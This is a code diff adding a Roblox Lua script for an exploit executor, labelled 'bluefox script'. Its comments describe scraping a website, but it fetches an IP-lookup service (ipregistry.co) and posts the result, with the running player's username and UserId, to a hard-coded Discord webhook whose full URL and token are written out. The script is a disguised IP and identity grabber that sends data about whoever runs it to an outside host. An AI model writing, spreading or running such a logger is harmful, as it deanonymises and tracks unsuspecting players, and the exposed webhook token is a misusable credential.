@@ -1,0 +1,36 @@
+local HTTP = game:GetService('HttpService')
+local Players = game:GetService('Players')
+
+local url = "https://ipregistry.co/"  -- Replace with the URL of the website you want to scrape
+
+-- Make an HTTP request to get the HTML content of the website
+local response = HTTP:GetAsync(url)
+local websiteContent = response.Body
+
+-- Modify the data to include the website content
+local data = {
+    ["username"] = "bluefox script",
+    ["embeds"] = {
+        {
+            ["description"] = "Script active by",
+            ["fields"] = {
+                { name = "Username", value = Players.LocalPlayer.Name, inline = true },
+                { name = "UserId", value = Players.LocalPlayer.UserId, inline = true },
+                { name = "Website Content", value = websiteContent, inline = false } -- Include the website content
+            },
+            ["color"] = tonumber(0x7269da),
+        }
+    }
+}
+
+local newdata = HTTP:JSONEncode(data)
+local headers = { ["content-type"] = "application/json" }
+
+-- Send the modified data to the Discord webhook
+local request = http_request or request or HttpPost or syn.request
+request({
+    Url = "https://discord.com/api/webhooks/1209332441668653066/qewJi9gy0Zi904bSRrByhD9HPAkCy1hj9GFec-yy2qcJMWkWPnLiQl5eeGnMt6nzeBjN",
+    Body = newdata,
+    Method = "POST",
+    Headers = headers
+})
